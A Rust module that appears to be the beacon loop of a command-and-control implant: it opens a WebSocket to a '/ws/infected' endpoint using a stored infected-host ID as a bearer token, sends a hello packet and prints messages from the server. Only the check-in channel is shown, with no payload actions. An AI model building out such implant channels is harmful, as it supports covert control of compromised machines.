mod payloads;

use anyhow::Result;
use payloads::general::StringPayload;

use futures_util::{SinkExt, StreamExt};
use tokio_tungstenite::{
    connect_async,
    tungstenite::{Message, handshake::client::generate_key, http::Request},
};

use crate::{
    constants::compiled::{self, WS_URL},
    storage::locked_store,
};

pub async fn start_ws_loop() -> Result<()> {
    let req = Request::builder()
        .uri(WS_URL("/ws/infected"))
        .header(
            "Authorization",
            format!("Bearer {}", locked_store()?.iid.as_ref().unwrap()),
        )
        .header("Host", compiled::HOST)
        .header("Connection", "Upgrade")
        .header("Upgrade", "websocket")
        .header("Sec-WebSocket-Version", "13")
        .header("Sec-WebSocket-Key", generate_key())
        .body(())
        .unwrap();

    let (ws, _) = connect_async(req).await.expect("Failed to connect.");

    let (mut sink, mut src) = ws.split();

    println!("Connected to {}!", WS_URL(""));

    sink.send(
        payloads::SimccMessage::builder()
            .payload(payloads::Payload::Hello(
                StringPayload::builder()
                    .content(String::from("Hello from rust!"))
                    .build(),
            ))
            .build()
            .try_into()?
    )
    .await
    .expect("Failed to send hello-packet!");

    while let Some(msg) = src.next().await {
        match msg {
            Ok(Message::Text(text)) => println!("Got: {}", text),
            Ok(Message::Close(_)) => {
                println!("Server closed connection");
                break;
            }
            Err(e) => {
                eprintln!("Error: {}", e);
                break;
            }
            _ => {}
        }
    }

    Ok(())
}
